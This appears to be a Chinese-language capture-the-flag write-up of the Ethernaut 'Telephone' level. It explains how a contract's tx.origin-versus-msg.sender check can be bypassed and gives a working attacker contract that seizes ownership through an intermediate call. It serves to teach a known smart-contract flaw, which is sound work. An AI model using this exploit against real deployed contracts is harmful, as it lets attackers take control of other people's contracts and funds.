# Telephone

Telephone这一关要求我們成爲目標合約的owner,考察了solidity中对于`msg.sender`和`tx.origin`的区别。让我们先来看这个合约的代码

## 合约代码
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```
 
## 代码分析
这个合约中改变`owner`使用的是`changeOwner`函数，这个函数中有一个判断，如果`tx.origin`不等于`msg.sender`，那么就可以改变`owner`。但是如果当我们直接call `changeOwner`函数的时候，`tx.origin`和`msg.sender`是相等的，这样就会导致我们没有办法改变`owner`。这里需要提及的一个知识点是：
假设我们有两个合约`A`和`B`, Alice调用了合约`A`的一个函数，那么在这个情况下，`tx.origin`是Alice，并且`msg.sender`也是Alice。但如果Alice调用了合约`A`的一个函数，这个函数又调用了合约`B`的一个函数，那么在这个情况下，`tx.origin`是Alice，但是`msg.sender`是合约`A`。
根据以上的知识点，我们只需要创建一个合约，用这个合约来调用Telephone合约的`changeOwner`函数，就可以改变`owner`了。

## 攻击代码
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    constructor(address _target){
        Telephone(_target).changeOwner(msg.sender);
    }
}

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

```
## 攻击过程
1. 部署Telephone的新实例，获得合约地址
2. 部署Attacker合约，将Telephone合约地址作为constructor的参数，这样就将owner改成了我们的钱包地址了
